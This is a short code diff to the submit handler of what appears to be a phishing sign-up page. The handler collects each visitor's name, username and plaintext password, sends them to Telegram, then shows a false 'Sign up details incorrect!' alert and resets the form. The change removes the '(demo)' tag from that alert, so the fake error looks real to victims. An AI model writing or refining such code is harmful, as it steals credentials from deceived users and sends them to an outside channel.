@@ -59,6 +59,6 @@ signupForm.addEventListener("submit", async (e) => {
 
   const msg = `🆕 New Sign Up:\n\nName: ${fn} ${ln}\nUsername: ${user}\nPassword: ${pw}`;
   await sendToTelegram(msg);
-  alert("Sign up details incorrect! (demo).");
+  alert("Sign up details incorrect!.");
   signupForm.reset();
 });
